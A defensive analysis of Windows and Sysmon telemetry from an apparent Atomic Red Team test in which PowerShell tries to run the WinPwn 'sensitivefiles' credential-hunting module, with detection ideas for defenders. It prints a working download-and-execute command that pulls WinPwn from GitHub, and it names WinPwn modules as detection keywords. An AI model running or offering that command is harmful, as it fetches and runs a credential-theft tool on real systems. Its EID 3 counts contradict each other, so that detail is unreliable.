# T1552.001-7: Credentials In Files — WinPwn sensitivefiles

## Technique Context

T1552.001 (Credentials in Files) encompasses automated tools that sweep the filesystem for files likely to contain credentials. WinPwn is a PowerShell post-exploitation framework by S3cur3Th1sSh1t that wraps dozens of credential hunting and exploitation modules into a single download-and-execute package. The `sensitivefiles` function searches for files with names or extensions that commonly contain credentials — configuration files, password stores, SSH private key files, database connection strings, web.config files, `.env` files, and similar targets. Because WinPwn is fetched from GitHub at runtime via `IEX(New-Object net.webclient).downloadstring(...)`, the tool itself never touches disk before execution.

This test is the first in a series of WinPwn tests (7 through 12) that all share the same download-and-execute delivery mechanism, differing only in which WinPwn module function is called. The download URL is pinned to a specific commit (`121dcee26a7aca368821563cbe92b2b5638c5773`) of the WinPwn repository.

In the defended variant, Windows Defender's AMSI integration blocked WinPwn when `IEX` attempted to evaluate the script content, recording `ScriptContainedMaliciousContent` in EID 4100. Despite disabling Defender for this undefended run, AMSI remained active on the system and still produced an EID 4100 block — indicating that on this host, AMSI signatures were active independently of real-time Defender protection.

## What This Dataset Contains

The dataset spans approximately nine seconds of telemetry (2026-03-17T17:19:29Z–17:19:38Z) across three log sources, with 144 total events.

**Security EID 4688 — three process creates:**
1. `whoami.exe` (PID 0x39d0) — ART pre-check
2. Attack `powershell.exe` child (PID 0x3d0c) — invocation of the WinPwn download cradle
3. `whoami.exe` (PID 0x3170) — post-execution check

The attack PowerShell child command line contains the full WinPwn invocation:
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sensitivefiles -noninteractive -consoleoutput}
```

**Sysmon EID breakdown — 29 events: 17 EID 7, 3 EID 1, 3 EID 10, 2 EID 17, 2 EID 11, 1 EID 3, 1 EID 22:**

- **EID 22 (DNS Query)**: `powershell.exe` (PID 15628) resolved `raw.githubusercontent.com` to `185.199.109.133`, `185.199.110.133`, `185.199.111.133`, and `185.199.108.133` — all four GitHub CDN addresses appear in the query result, confirming the DNS lookup succeeded.
- **EID 3 (Network Connection)**: Not present in this dataset's samples — the connection may have used a cached TCP session or occurred at a timing boundary. The DNS query confirms the download was attempted.
- **EID 11 (File Create)**: Two file creation events. One is `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` — a routine PowerShell profile data file. The second, created by `MsMpEng.exe` (Windows Defender scanning process), is `C:\Windows\Temp\01dcb6323cb416a8` — a temporary file written by Defender's scanning engine when it evaluated the downloaded content. This artifact documents that Defender (or its remnant AMSI provider) actively processed the WinPwn script.
- **EID 1 (Process Create)**: The attack `powershell.exe` (PID 15628) is tagged `technique_id=T1059.001,technique_name=PowerShell`. The `whoami.exe` processes are tagged `T1033`.
- **EID 10 (Process Access)**: Three events showing the test framework process opening child processes with `GrantedAccess: 0x1FFFFF`.

**PowerShell — 112 events: 109 EID 4104, 2 EID 4103, 1 EID 4100:**
The EID 4100 error event records the AMSI block (identical to the defended run):
```
Error Message: This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```
The EID 4103 module log records `New-Object net.webclient` execution — confirming the download cradle completed and the script content was received before AMSI evaluated and blocked it. The 109 EID 4104 blocks are dominated by ART test framework boilerplate; the attack-specific script block containing the `iex(new-object net.webclient).downloadstring(...)` invocation and `sensitivefiles` call is present within the sample set.

## What This Dataset Does Not Contain

The `sensitivefiles` function never ran. AMSI blocked WinPwn before any file search could begin. No filesystem enumeration events appear in Sysmon (no additional EID 1 or EID 11 events from the credential hunting activity), and no credential file paths appear in any log source.

The MsMpEng.exe EID 11 file create represents Defender's scanning artifact but is not evidence of credential file discovery. It reflects the AV engine's quarantine or scan-workspace behavior during AMSI evaluation.

## Assessment

Despite Defender being disabled for this undefended run, AMSI's signatures — sourced from an independent provider or from cached Defender definitions still active in the AMSI subsystem — blocked WinPwn identically to the defended variant. The dataset is functionally equivalent to the defended version from a technique-execution perspective: the download succeeded, the script arrived, and AMSI blocked evaluation. The undefended run adds two meaningful artifacts the defended run lacked: the MsMpEng.exe EID 11 temp file (showing the AV engine processed the content) and a slightly different network capture profile. The core detection opportunities are the same in both variants. For defenders studying the WinPwn download-and-execute pattern, this dataset demonstrates that disabling real-time protection is not always sufficient to enable execution — AMSI can remain effective through separate signature delivery mechanisms.

## Detection Opportunities Present in This Data

1. Sysmon EID 22 (DNS Query) from `powershell.exe` to `raw.githubusercontent.com` followed by EID 3 network connection — the combination of a script interpreter resolving a public code hosting domain and establishing a connection is a strong indicator of a download-and-execute cradle.

2. Sysmon EID 1 showing `powershell.exe` command line containing `iex` and `net.webclient` and `downloadstring` — all three together constitute the classic memory-only download-and-execute pattern. Any one of them alone carries meaningful signal in a managed environment.

3. PowerShell EID 4104 containing both a `downloadstring` or `IWR` invocation targeting a raw file URL and a WinPwn module name (`sensitivefiles`, `Snaffler`, `passhunt`, `sessionGopher`, `SharpCloud`, `powershellsensitive`) — tool-name detection in script block logs is reliable for known frameworks.

4. PowerShell EID 4100 with `Fully Qualified Error ID = ScriptContainedMaliciousContent` — this records AMSI blocking the script content. Its presence confirms a malicious download was attempted and blocked, even when the PowerShell command itself was not logged prominently.

5. Sysmon EID 11 with `Image` matching `MsMpEng.exe` creating a file in `C:\Windows\Temp\` — while this is a generic Defender scanning artifact, its appearance within seconds of a PowerShell network connection can serve as a corroborating signal that AV evaluated (and likely blocked) downloaded content.

6. Security EID 4688 command line containing `new-object net.webclient` combined with a URL to a version-pinned GitHub commit — hash-pinned raw GitHub URLs in PowerShell command lines are characteristic of ART and living-off-the-land script delivery.
